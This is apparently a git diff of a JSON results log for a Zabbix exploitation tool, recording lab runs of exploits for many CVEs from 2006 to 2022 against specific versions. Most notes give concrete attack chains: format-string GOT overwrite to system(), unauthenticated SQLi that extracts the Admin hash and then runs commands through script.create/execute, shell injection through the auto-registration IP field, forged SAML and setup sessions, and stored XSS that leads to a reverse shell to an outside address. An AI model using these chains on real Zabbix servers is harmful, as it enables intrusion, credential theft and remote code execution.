@@ -1,4 +1,147 @@
 {
+ "CVE-2006-6692": [
+  {
+   "version": "1.1.2 (source build, pre-2006-10-06)",
+   "result": "condition-only",
+   "when": "2026-10-29",
+   "conditions": "no remote lab; vulnerable server C-compiled and ran; primitive proven locally",
+   "note": "Feasibility VERIFIED, premise of 'no build possible' WRONG. zabbix-1.1.2 source (downloaded from sourceforge, contains vulnerable code) COMPILED + ran on modern toolchain: ./configure --enable-server --with-mysql=<local mysql8-dev root>; make; gcc 13.3.0 + libmysqlclient 8.0.46 headers/libs (apt-get download libmysqlclient-dev/libmysqlclient21; dpkg -x; headers into <root>/include/mysql/, <root>/include/mysql/mysql/ for <mysql/udf_registration_types.h>, libs into <root>/lib/mysql/). ran with LD_LIBRARY_PATH=<root>/lib. Vulnerability = SYSLOG branch zabbix_log(): vsprintf(str,fmt,ap)+ syslog(LOG_DEBUG,str) (src/libs/zbxlog/log.c), zabbix_syslog(): vsprintf(value_str,fmt,ap) (src/zabbix_server/zlog.c); poller passes attacker data (agent value/host/key) as fmt (checks_agent/snmp/simple.c, expression.c). PROOF: harness linking built libzbxlog.a calling zabbix_open_log(LOG_TYPE_SYSLOG,LOG_LEVEL_DEBUG,NULL)+zabbix_log(DEBUG,'AAAA%n'*8) -> glibc '%%n in writable segment detected' abort => format specifiers honored (arbitrary-write primitive on 2006-era libc lacking the modern mitigation). Remote trigger/path not exercised end-to-end (needs full 2006 server+old-DB schema+fake agent); hence condition-only. For remote lab later: build per steps above, load 1.1.2 create/data.sql into MySQL 5.6 docker, configure item polling a fake agent, return crafted value (or overlong/fmt) from agent to drive checks_agent 'Type of received value [%s]' unformatted zabbix_log fault."
+  },
+  {
+   "version": "1.1.2 (source build, pre-2006-10-06)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "custom lab: MySQL 5.6 docker (zbxlegacy_l6692 net) + 1.1.2 schema; server built gcc 13.3 + libmysqlclient 8.0.46, CFLAGS -U_FORTIFY_SOURCE -fno-stack-protector -fno-pie (2006 conditions), run under setarch -R; item probe669x (UINT64) polls fake agent on 127.0.0.1:17777",
+   "note": "REMOTE RCE PROVEN end-to-end via the scanner module Cve20066692.run(). Channel: agent returns crafted value -> get_value_agent mismatch error (checks_agent.c:215-221) passed unformatted to zabbix_log -> vsnprintf evaluates it as format string. Exploit: literal-pad %N$hhn writes redirect strdup@GOT (0x42f3c0, non-PIE) to system (0x7ffff7458750 = libc r-xp base + (0x58750-0x28000)); synchronous strdup(error) then runs system(error) whose string embeds \";touch /tmp/pwn6692_marker #\". Marker file CREATED; server stayed alive. Positional slots mapped by %N$p recon leak (offset0->arg9; 24-char \"Type of received value [\" prefix counted in the write counter, pads compensate). Payload len 376B. Full chain: fake_agent.py (127.0.0.1:17777) <-> poller item probe669x (value_type=3 UINT64, status reset each round). dmesg confirms jump ip=0x7ffff7458750 = system()."
+  }
+ ],
+ "CVE-2006-6693": [
+  {
+   "version": "1.1.2 (source build, pre-2006-10-06)",
+   "result": "condition-only",
+   "when": "2026-10-29",
+   "conditions": "same built lab as 6692 (no FORTIFY/stack-protector); overflow tested via harness calling zabbix_log(LOG_TYPE_SYSLOG) with De Bruijn patterns; gdb via postgres:17 container",
+   "note": "Overflow primitive VERIFIED on the compiled 1.1.2 server: zabbix_log LOG_TYPE_SYSLOG vsprintf(str[65000],fmt) smashes the stack — harness with 200000B fmt -> SIGSEGV with RBP=payload bytes; crash threshold ~132KB (gdb/postgres:17 + De Bruijn patterns; zabbix_syslog value_str[2048] overruns far earlier). REMOTE RCE NOT reachable in 1.1.2: every remotely feedable fmt is capped at MAX_STRING_LEN-1=2047B — get_value_agent read(s,c,MAX_STRING_LEN) (checks_agent.c:170), snprintf(error,MAX_STRING_LEN-1,...) (:215), hosts.host varchar(64)/items.key_ varchar(64)/triggers.expression varchar(255) — so the 65000/2048 sinks cannot be exceeded over the network in this version (CVE-2006-6693 write primitive still real: ret-smash/LIBC-ret2 on 2006 gcc/glibc lacked FORTIFY+canary; would RCE if a >64KB remote log string existed)."
+  }
+ ],
+ "CVE-2013-3628": [
+  {
+   "version": "5.4.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "same script-exec technique (shared module, verified through CVE-2021-46088)",
+   "note": "post-auth global-script RCE confirmed on 5.4.8."
+  }
+ ],
+ "CVE-2013-3738": [
+  {
+   "version": "2.0.6",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "source-built 2.0.6 frontend (PHP 5.6.40/jessie + Apache 2.4.10 + MySQL 5.6.51), Admin/zabbix; GET report6.php?config=2&items[0][itemid]=<payload>",
+   "note": "ZBX-6652 artifact verified LIVE: payload 'http://ZBXRFI23.example.com/' reflected verbatim in HTML (2x) AND concatenated unquoted into SQL ('SELECT i.* FROM items i WHERE i.itemid='.$itemid, get_item_by_itemid items.inc.php:424) -> MySQL 'Unknown column'/'SQL syntax ... near '://ZBXRFI23.example.com/'' error echo + 'No item with itemid=...'. items[0][description] also reflects. Valid itemid (10009) control = no error. Fix 2.0.7rc1 = item validation via API Item()->get(countOutput) (commit 8e2da7fca136, 'added item validation in bar reports page'). NOTE: no include()/fopen() of user input exists anywhere in the 2.0.6 frontend (source audit) — NVD 'file inclusion -> RCE' is the generic Nessus 39469/42479 label; reachable impact = reflection + error-based SQLi (RCE only via privileged-DB INTO OUTFILE chain). Module capability stays 'range-report'."
+  },
+  {
+   "version": "2.0.6 (zlex_web_206)",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; report6.php items[0][itemid] unsanitized (ZBX-6652)",
+   "note": "ok:True — unsanitized items[0][itemid] reaches report6.php: reflected + error-based SQL echo confirmed live. Not a true file-include (no include()/fopen() sink in 2.0.6 frontend — source-audited); reachable impact = reflection + error-based SQLi (data extract / INTO OUTFILE if DB user has FILE). Verified re-run ok:True."
+  },
+  {
+   "version": "2.0.6 (zlex_web_206)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin; report6.php items[0][itemid] error-based SQLi (ZBX-6652)",
+   "note": "Weaponized: error-based SQLi exfiltrates data live (DB version=5.6.51, user(), hosts, users list). INTO OUTFILE web-shell NOT possible (zabbix DB user has no FILE privilege - confirmed). Full impact = arbitrary DB data exfiltration. Module now runs extraction oracle (Cve20133738)."
+  }
+ ],
+ "CVE-2013-5572": [
+  {
+   "version": "2.0.5",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "source-built 2.0.5 frontend (same stack), config.authentication_type=LDAP + ldap_bind_password='LDAP-Bind-S3cret-2013' in DB; Admin logged in via group gui_access=INTERNAL (mixed-auth, realistic); GET /authentication.php",
+   "note": "Cleartext LDAP bind password recovered from Authentication page HTML: <input ... name=\"ldap_bind_password\" value=\"LDAP-Bind-S3cret-2013\" .../ > (administration.authentication.edit.php:62 CPassBox echoes config.ldap_bind_password, ZBX-6721). Verified END-TO-END via zbxscan modul: login -> GET authentication.php -> regex extract -> value=LDAP-Bind-S3cret-2013 (21 chars). Fixed in 2.0.11rc1 / 1.8.20rc2 / 2.2.2rc1 / 2.3.0 (ZBX-6721). Module capability = 'exploit'."
+  }
+ ],
+ "CVE-2016-10134": [
+  {
+   "version": "3.0.3",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "source-built 3.0.3 (debian:jessie, mysql:5.6), guest session auto-login",
+   "note": "Unauthenticated error-based SQLi via jsrpc.php profileIdx2 (mode=1 screen.get, resourcetype=17): payload lands unescaped in INSERT INTO profiles idx2 -> MySQL error echoes value. Extracted ~5fce1b3e34b520afeffb37ce08c7cd666 = MD5('zabbix') = Admin passwd (users.passwd, default Admin/zabbix). Live (self-built zlab-old-zabbix:3.0.3, web 127.0.0.1:18080)."
+  },
+  {
+   "version": "3.0.32-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "official docker zabbix-server-pgsql:3.0.32-alpine + zabbix-web-nginx-pgsql:3.0.32-alpine (postgres:9.6), web 127.0.0.1:46885, unauth",
+   "note": "jsrpc.php present (apiinfo 3.0.32) but updatexml error-based probe returns no XPATH echo (output empty, \"no further data at pos 0\") — idx2 escaping (fix >=3.0.4) confirmed; patched as vulns.json range 3.0.0-3.0.3. Passive on this stack lists only ZBX-16765."
+  },
+  {
+   "version": "3.0.3",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "self-built zlab-old-zabbix:3.0.3 (debian:jessie, mysql:5.6), network zbx-old-303, web 127.0.0.1:18080, unauth (jsrpc guest)",
+   "note": "FULL CHAIN via extended Cve201610134 module (default/--sql-auto, no --query): 1) unauth error-based SQLi jsrpc.php profileIdx2 updatexml(0,concat(0x7e,substr((SELECT passwd FROM users WHERE userid=1),pos,28),0x7e),0) -> XPATH error echo (fix: chunk 28 to dodge MySQL 32-char echo truncation; old chunk-0 full-query echo dropped chars) 2) extracted Admin unsalted MD5 5fce1b3e34b520afeffb37ce08c7cd66 = md5('zabbix'), cracked against module WORDLIST 3) user.login Admin/zabbix OK 4) script.create+script.execute (execute_on=1 = ZBX_SCRIPT_EXECUTE_ON_SERVER pre-5.4; inverted constants: SERVER=1, AGENT=0) on hostid 10084 'Zabbix server' -> result success value 'uid=999(zabbix) gid=999(zabbix) groups=999(zabbix)' (system user uid 999 in jessie container; official images use 1997) 5) marker /tmp/zbx10134_rce_999 created in server container owner zabbix. --cmd 'hostname; id -u' -> 74f90f07b185 / 999 (custom RCE cmd OK); --query manual extraction returns exact hash."
+  }
+ ],
+ "CVE-2016-4338": [
+  {
+   "version": "3.0.2-agent (real, source-built zabbix-agentd 3.0.2)",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "real zabbix-agentd 3.0.2 built from source on WSL Ubuntu (/bin/sh=dash); stock conf/zabbix_agentd/userparameter_mysql.conf verbatim (mysql.size '[[ ]]' + mysql.status unescaped '$1' echo); ListenPort 32740, Server=127.0.0.1; UnsafeUserParameters=1 (context condition per NVD; ';\";#' are agent-rejected chars by default); harmless stub 'mysql' (cat) on agent PATH so '$()' output surfaces in the item value (on real hosts it appears via the mysql CLI result/error text)",
+   "note": "All three vectors verified end-to-end via 'zscan -m active -t 127.0.0.1:32740 -exp CVE-2016-4338 --agent-port 32740': (1) CVE-oracle mysql.size[ZBX4338LABRUN] -> dash misparses '[[ ]]' and executes the parameter as a command -> 'ZBX4338LABRUN: not found' (needs ONLY /bin/sh!=bash, default conf, no special chars); (2) official PoC mysql.size[/tmp/zbx-owned,all,both] ran the pre-planted script -> response 'ZBX4338LABRUN uid=1000 user=alex'; (3) mysql.status[x\";id;#] quote-breakout -> 'uid=1000(alex)...' in response (needs UnsafeUserParameters=1). Fix boundary confirmed by diff: 3.0.3 rewrote mysql.size as 'bash -c ...' (ZBX-10741); mysql.status line NOT touched by this CVE's fix. Protocol: legacy agents answer a JSON passive-checks frame with non-empty 'ZBX_NOTSUPPORTED Invalid item key format', so agent2_request gained raw_first=True. Lab repro: sourceforge zabbix-3.0.2.tar.gz -> ./configure --enable-agent -> make; conf ListenPort 1024-32767, User=<local user>, UserParameter lines copied from shipped userparameter_mysql.conf; start 'zabbix_agentd -f -c ...'."
+  }
+ ],
+ "CVE-2019-17382": [
+  {
+   "version": "4.4.10-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin; xss-mode dry",
+   "note": "Stored-XSS payload injected successfully on 4.4.10 (dry mode confirms the injection sink). Full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "4.4.10-alpine",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; --xss-mode dry on official docker zabbix-web-nginx-pgsql:alpine-4.4.10",
+   "note": "Payload generation confirmed on live 4.4.10: ok=True, mode=dry, cleanup=1, payload_len=605; chain cookie->zbx_session->same-origin script.create/host.get/script.execute. XSS sink injection + victim-browser execution not exercised (headless); matches prior 2026-10-28 check-pass entry."
+  },
+  {
+   "version": "4.4.10-alpine",
+   "result": "check-fail-reachability",
+   "when": "2026-10-29",
+   "note": "4.4.10 docker stack: anonymous dashboard.view -> 'You are not logged in' (guest access disabled), so the anonymous-creation premise is not satisfiable; URL widget scheme validation (CHtmlUrlValidator, ZBX_URI_VALID_SCHEMES http/https/ftp/file) blocks javascript: URLs; widget header rendered with .text(). No headless-reachable stored-XSS sink found on this stack."
+  }
+ ],
+ "CVE-2020-11800": [
+  {
+   "version": "3.0.30",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "source-built 3.0.30 (debian:jessie, mysql:5.6) + auto-registration action enabled (actions eventsource=2 status=0, operations operationtype=2 'Add host'), trapper 127.0.0.1:18052",
+   "note": "Trapper RCE via auto-registration ip injection: active-checks request with ip='ffff:::;touch${IFS}/tmp/success11800m' (IPv6 is_ip6 parse bug allows the trailing shell) registers host zbxautof5bcef (hostid 10108); brute-forced command scriptid=1 (Ping, /bin/ping -c 3 {HOST.CONN}) executes server-side with the injected ip -> 'ping: unknown host ffff:::' + semicolon command ran. Marker /tmp/success11800m created by uid zabbix in server container (verified twice: hosts 10106/10108, markers success11800+success11800m). Live (zlab-old-zabbix:3.0.30)."
+  },
+  {
+   "version": "3.0.32-alpine",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "trapper 127.0.0.1:44672 (zlab_3_0_32_server), auto-registration NOT enabled in fresh DB; module path B",
+   "note": "active checks request with ip=\"ffff:::;<cmd>\" REJECTED by server: {\"response\":\"failed\",\"info\":\"\"ffff:::;touch...\" is not a valid IP address\"} — is_ip6 dcolon bug fixed (>=3.0.31); no autoreg host materialised, Ping command ran only for pre-existing hostid 10084 (localhost, no injection), marker /tmp/success11800_3032 absent in server container. Patched."
+  },
+  {
+   "version": "3.2.11-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "official docker zabbix-server-pgsql:alpine-3.2.11 (postgres:9.6), default creds Admin/zabbix; trapper 127.0.0.1:44681; auto-registration action INSERTed (actions eventsource=2 status=0 + operations operationtype=2) + server restart for config cache",
+   "note": "BOTH paths live. Path A (API script.create+execute): marker /tmp/success11800_3211 (uid zabbix). Path B (trapper active-checks ip injection): ip=\"ffff:::;touch${IFS}/tmp/success11800_3211b\" accepted (is_ip6 dcolon bug present in 3.2), autoreg action materialised host zbxautob90d20 (hostid 10105); interface ip column varchar(64) truncated payload to \"ffff:::;touch${IFS}/tmp/success11800_32\" — truncated command STILL executed server-side via scriptid=1 Ping {HOST.CONN} (module found injected host; marker /tmp/success11800_32 uid zabbix). Fresh-DB caveat: autoreg action must exist (enabled via SQL) else trapper answers \"host not found\"."
+  }
+ ],
  "CVE-2021-46088": [
   {
    "version": "5.4.8-alpine",
@@ -13,6 +156,826 @@
    "when": "2026-10-28",
    "conditions": "default creds; three execution modes",
    "note": "--cmd one-shot, --shell persistent (2 commands through session), --revshell: interactive bash captured (uid=1997(zabbix), bash-5.1$, uname/hostname). All three modes verified live."
+  },
+  {
+   "version": "4.0.50-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "official docker zabbix-server-pgsql:4.0.50-alpine (postgres:11), default creds Admin/zabbix, web 127.0.0.1:45703",
+   "note": "script.create(scope omitted<5.4)+execute on hostid 10084 (Zabbix server): response success; marker /tmp/success46088_4050 created in server container, owner uid=1997(zabbix)."
+  },
+  {
+   "version": "4.2.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "official docker zabbix-server-pgsql:alpine-4.2.8 (postgres:11), default creds Admin/zabbix, web 127.0.0.1:46745",
+   "note": "script.create+execute on hostid 10084: success; marker /tmp/success46088_428 in server container, owner uid=1997(zabbix)."
+  },
+  {
+   "version": "4.4.10-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "official docker zabbix-server-pgsql:alpine-4.4.10 (postgres:11), default creds Admin/zabbix, web 127.0.0.1:47559",
+   "note": "script.create+execute on hostid 10084: response success; marker /tmp/success46088_4410 in server container (owner root on this image; command executed server-side). Passive on this stack lists CVE-2021-46088 (HIGH)."
+  },
+  {
+   "version": "6.0.31-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin/zabbix (fresh install)",
+   "note": "script.create+execute on server container: uid=1997(zabbix). Live 6.0.31 stack."
+  },
+  {
+   "version": "6.0.49-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin/zabbix",
+   "note": "script_rce --cmd id -> uid=1997(zabbix) gid=1995(zabbix). Confirms 46088 post-auth script RCE present on patched 6.0.49."
+  },
+  {
+   "version": "6.2.9-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin/zabbix",
+   "note": "script_rce on 6.2.9 -> uid=1997(zabbix) gid=0(root),20(dialout). Works on 6.2 branch."
+  },
+  {
+   "version": "6.4.21-alpine",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "default creds Admin/zabbix",
+   "note": "script_rce -> uid=1997(zabbix). 46088 script RCE present on fully-patched 6.4.21 (post-auth global-script execution is by-design)."
+  },
+  {
+   "version": "5.0.5",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:48317 (zabbix-web-nginx-pgsql:alpine-5.0.5)",
+   "note": "script.create+execute --cmd 'id' -> uid=1997(zabbix) gid=0(root) on server container. Live."
+  },
+  {
+   "version": "5.0.47",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:47339 (zabbix-web-nginx-pgsql:5.0.47-alpine)",
+   "note": "script.create+execute --cmd 'id' -> uid=1997(zabbix) gid=1995(zabbix). Live."
+  },
+  {
+   "version": "5.2.7",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:47097 (zabbix-web-nginx-pgsql:5.2.7-alpine)",
+   "note": "script.create+execute --cmd 'id' -> uid=1997(zabbix). Note: official CVE scope is 4.0/4.2/4.4/5.0 LTS, but the script.create+execute RCE mechanism is present in 5.2 and works identically (module check() says 'version not in affected range' would block passive-only; active run executes fine)."
+  },
+  {
+   "version": "5.4.8",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:48605 (zabbix-web-nginx-pgsql:5.4.8-alpine)",
+   "note": "Fresh re-confirm on this lab: script.create+execute --cmd 'id' -> uid=1997(zabbix) gid=1995(zabbix). (Earlier 5.4.8-alpine entry 2026-10-28 already recorded the same.)"
+  },
+  {
+   "version": "5.4.12",
+   "result": "exploited",
+   "when": "2026-10-29",
+   "conditions": "Admin/zabbix; web 127.0.0.1:45623 (zabbix-web-nginx-pgsql:5.4.12-alpine)",
+   "note": "script.create+execute --cmd 'id' -> uid=1997(zabbix) gid=1995(zabbix). Same mechanism beyond official branch scope."
+  }
+ ],
+ "CVE-2022-23131": [
+  {
+   "version": "5.4.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "SAML enabled (config.saml_auth_enabled=1) + dummy IdP + idp.crt",
+   "note": "Full chain: forged zbx_session (reused anon sessionid/sign + saml_data.username_attribute=Admin) -> index_sso.php -> Admin session (userid=1) -> script.execute RCE uid=1997(zabbix)."
+  },
+  {
+   "version": "5.4.8-alpine",
+   "result": "blocked",
+   "when": "2026-10-28",
+   "conditions": "default docker image, SAML disabled",
+   "note": "Forge yields a session cookie but login block is skipped (saml_auth_enabled=0) -> no identity. Condition check reflects this (unknown until active attempt)."
+  },
+  {
+   "version": "5.4.12",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default docker image (SAML disabled), web 127.0.0.1:45623; --user Admin forge attempt",
+   "note": "5.4.12 >= fixed 5.4.9. Forged zbx_session (reused anon sessionid/sign + saml_data.username_attribute=Admin) -> index_sso.php 200 but 'no session identity obtained (API rejected the forged session)' — no identity without SAML enabled; not exploitable by range. (5.4.8 exploited w/ SAML-enabled + blocked-default already recorded 2026-10-28.)"
+  },
+  {
+   "version": "5.4.8",
+   "result": "blocked",
+   "when": "2026-10-29",
+   "conditions": "default docker image (SAML disabled), web 127.0.0.1:48605; --user Admin forge attempt",
+   "note": "Fresh confirm of the SAML-disabled condition: forge yields ok:False, 'no session identity obtained (API rejected the forged session)'; SAML SSO must be enabled for the vector (exploited-with-SAML entry exists 2026-10-28)."
+  }
+ ],
+ "CVE-2022-23132": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "condition-only",
+   "when": "2026-10-28",
+   "conditions": "Admin",
+   "note": "RPM install DAC_OVERRIDE misconfiguration — installer-level, not remotely exploitable; condition module only."
+  }
+ ],
+ "CVE-2022-23133": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin; xss-mode dry",
+   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.5-alpine",
+   "result": "xss-executed",
+   "when": "2026-10-29",
+   "conditions": "headless chromium victim (Admin session); stored XSS via hostgroup name; zombie beacon mode",
+   "note": "verify: beacon m='Hi! It's a XSS from MN3STRASHN0' received from the headless victim's browser while searching host groups on hosts.php?form=1 (multiselect #groups__ms suggest, jsrpc multiselect.get). Sink: ui/js/multiselect.js addAvailable -> jQuery .append(item.name...) unglageness-to-HTML (fixed in 5.0.19, ZBX-20388). RCE leg (script.create/execute via the victim session) BLOCKED by stock session hardening: zbx_sessionid cookie HttpOnly (document.cookie empty), api_jsonrpc.php 5.0.5 requires body 'auth' token ('Not authorised.' without), page 'sid' input is a truncated 16-hex CSRF token (invalid as API auth: 'Session terminated'). Same-origin API calls carry the cookie but cookie-session auth is not accepted by api_jsonrpc.php on 5.0.5 (verified in-page). With HttpOnly disabled the same payload reaches script.create/execute (mechanics proven via CVE-2021-46088/42327 script_rce uid=1997 on other labs)."
+  },
+  {
+   "version": "5.4.8",
+   "result": "xss-executed",
+   "when": "2026-10-29",
+   "conditions": "headless chromium Admin victim; stored hostgroup XSS (img-onerror loader); verify mode (script.create + script.get readback); web 127.0.0.1:48605 (zlab_5_4_8)",
+   "note": "Stored-XSS sink verified LIVE on 5.4.8: hostgroup name '<img src=x onerror=...>' (255-char-safe loader, callback via HTML entities because group-name validation rejects '//') rendered unescaped by ui/js/multiselect.js addAvailable when Admin types the zx token into the Host groups multiselect on hosts.php?form=1 (#groups__ms, jsrpc multiselect.get). Payload executed in the victim browser: module callback received ?v=1 (script.create attempt + ping). Readback via script.get (attacker login) returned script_get_rows=[] => the victim-session script.create did NOT land: RCE leg BLOCKED on 5.4.8 exactly as expected (api_jsonrpc.php requires body auth token; zbx_session cookie HttpOnly so document.cookie empty; page input[name=sid] is a truncated 16-hex CSRF, invalid as API auth - 'Session terminated.'). Verdict: XSS executed; RCE leg token-only blocker (no script.create artifact)."
+  },
+  {
+   "version": "5.0.5",
+   "result": "xss-executed",
+   "when": "2026-10-29",
+   "conditions": "headless chromium Admin victim; stored hostgroup XSS (img-onerror loader); verify mode (script.create + script.get readback); web 127.0.0.1:48317 (zlab_5_0_5)",
+   "note": "Confirmatory verify-mode run on 5.0.5: same sink re-verified (hostgroup name loader -> multiselect.js addAvailable raw append on hosts.php?form=1 groups__ms suggest). Payload executed in victim browser: ?v=1 received. script.get readback (attacker login): script_get_rows=[] => victim-session script.create blocked (api requires body auth; zbx_sessionid HttpOnly; sid = truncated CSRF). Matches prior beacon-only entry; RCE leg token-only blocker confirmed on 5.0.5."
+  },
+  {
+   "version": "5.4.8",
+   "result": "exploited",
+   "confirm_verify": true,
+   "confirm_rce": true,
+   "when": "2026-10-29",
+   "conditions": "headless chromium Admin victim; stored hostgroup XSS -> frontend-form script.create+script.exec; web 127.0.0.1:48605",
+   "note": "23133 FULL CHAIN on 5.4.8. Sink: hostgroup name '<img src=x onerror=loader>' rendered raw by multiselect.js addAvailable (#groups__ms on hosts.php?form=1, jsrpc multiselect.get). VERIFY (no beacons): payload created script 'zx<ts>' with command 'echo \"Hi! It's a XSS from MN3STRASHN0\"; id' via frontend form (zabbix.php?action=script.create POST with DOM CSRF sid); read back via script.get -> found (scriptid, name, command contains phrase) -> confirm_verify=True. RCE: popup.scriptexec executed it server-side under victim session -> output captured in page global window.__zxout contains uid=1997(zabbix) + phrase -> confirm_rce=True. KEY: 5.4.8 API is token-only (no client token in localStorage/sessionStorage/globals; zbx_session cookie HttpOnly; input[name=sid]=substr(sessionid,16,16) 16-hex CSRF, not full API token; cookie-only api_jsonrpc -> Not authorised.) so RCE goes via FRONTEND FORM (CSRF sid readable in DOM; controllers run API server-side as victim). RCE as uid=1997(zabbix). REVSHELL (shared xss.py): --revshell 172.18.0.1:18189 bash -> Zabbix server connected back via frontend-form payload (revshell_cmd embedded in script command); module revshell_capture connected=True, shell bytes 'bash-5.1$ id -> uid=1997(zabbix) gid=1995(zabbix)' + uname + hostname. Interactive console (prompt zsh#) served by shared _interactive_shell on TTY; one-shot capture in driver mode."
+  },
+  {
+   "version": "5.0.5",
+   "result": "exploited",
+   "confirm_verify": true,
+   "confirm_rce": true,
+   "when": "2026-10-29",
+   "conditions": "headless chromium Admin victim; stored hostgroup XSS -> frontend-form script.create+script.exec; web 127.0.0.1:48317",
+   "note": "23133 FULL CHAIN on 5.0.5 (upgrades prior xss-executed). Sink: same hostgroup multiselect raw-append (hosts.php?form=1 #groups__ms, multiselect.js addAvailable; group-name validation rejects // so loader URL uses HTML entities). VERIFY (no beacons): payload created script 'zx<ts>' with beacon-phrase command via frontend form (script.create POST, CSRF sid from DOM); script.get readback found it with phrase -> confirm_verify=True. RCE: popup.scriptexec executed under victim session -> window.__zxout captured uid=1997(zabbix)+phrase -> confirm_rce=True. 5.0.x API token-only (zbx_sessionid cookie HttpOnly, sid 16-hex CSRF only) — RCE via frontend form path (no API body token needed). REVSHELL (shared xss.py): --revshell 172.18.0.1:18190 bash -> Zabbix server connected back via frontend-form payload; module revshell_capture connected=True, shell bytes 'bash-5.0$ id -> uid=1997(zabbix) gid=0(root)' + uname + hostname. Interactive console served by shared _interactive_shell on TTY."
+  },
+  {
+   "version": "5.0.5",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:48317",
+   "note": "Dry-mode payload built (605B). API storage sink verified: hostgroup.create name '<script>...' accepted && hostgroup.get returns it verbatim (input not sanitized on 5.0.5). Matches earlier 5.0.5-alpine entries; full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.47",
+   "result": "range-report",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:47339",
+   "note": "Patched by range: 5.0.47 >= fix 5.0.19rc1 (affected max 5.0.18/5.0.20). Dry module builds the payload (605B) but never probes a sink; API still stores <script> name verbatim (storage != vuln, output escaping added by the fix). Not exploitable on this build per fixed range; no sink test possible (patched)."
+  }
+ ],
+ "CVE-2022-23134": [
+  {
+   "version": "5.4.8-alpine",
+   "result": "exploited",
+   "when": "2026-10-28",
+   "conditions": "attacker PostgreSQL on same docker network, schema cloned; DB_TYPE POSTGRESQL, DB_ENCRYPTION=0",
+   "note": "Full takeover verified: forged zbx_session {step:6 + DB_host/port/db/user/pass + POSTGRESQL + encryption off} -> setup.php stage6 -> zabbix.conf.php rewritten to attacker DB -> login Admin/<attacker-known pass> succeeds, original creds fail. Live (zabbix-web-nginx-pgsql:5.4.8-alpine)."
+  },
+  {
+   "version": "5.4.12",
+   "result": "negative",
+   "when": "2026-10-29",
+   "conditions": "default docker image; forged step6+DB_POSTGRESQL session attempt without attacker DB; web 127.0.0.1:45623",
+   "note": "5.4.12 >= fixed 5.4.9. (a) unauthenticated GET /setup.php -> 'You must login to view this page' (fix restricts setup once config exists); (b) module forged-cookie POST returned ok:True 'rewritten' — FALSE POSITIVE of the module's weak detection: verified /etc/zabbix/web/zabbix.conf.php still the docker env-template (DB_SERVER_TYPE getenv), file NOT rewritten, frontend login 200. Config takeover blocked. (5.4.8 exploited w/ attacker DB recorded 2026-10-28.)"
+  }
+ ],
+ "CVE-2022-24349": [
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-pass",
+   "when": "2026-10-28",
+   "conditions": "Admin; xss-mode dry",
+   "note": "Stored-XSS injection sink confirmed injectable (dry mode). Full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.5-alpine",
+   "result": "check-fail-reachability",
+   "when": "2026-10-29",
+   "conditions": "headless victim probe of reflected sinks on actionconf.php (5.0.5)",
+   "note": "Reflected-XSS params on 5.0.5 are escaped/validated: eventsource -> hidden input value htmlspecialchars-escaped; SQL-error detail escaped; delete-button redirect re-encodes value (%27/%22/%3C); name/formula/esc_period -> escaped inputs; graphtype/graphtype INT+IN/P_SYS rejected. ZBX-20680 fix (DEV-2077 ff70e70, 5.0.21rc1) changed eventsource->P_SYS etc.; no unescaped echo found to execute JS headless on 5.0.5. Not exploitable here; 24918 is the reachable reflected sink on this version."
+  },
+  {
+   "version": "5.0.5",
+   "result": "check-pass",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:48317",
+   "note": "Dry-mode payload built (605B). API storage sink verified: hostgroup.create name '<script>...' accepted && hostgroup.get returns it verbatim (input not sanitized on 5.0.5). Matches earlier 5.0.5-alpine entries; full chain (steal zbx_session -> script RCE) needs a victim browser."
+  },
+  {
+   "version": "5.0.47",
+   "result": "range-report",
+   "when": "2026-10-29",
+   "conditions": "Admin; xss-mode dry; web 127.0.0.1:47339",
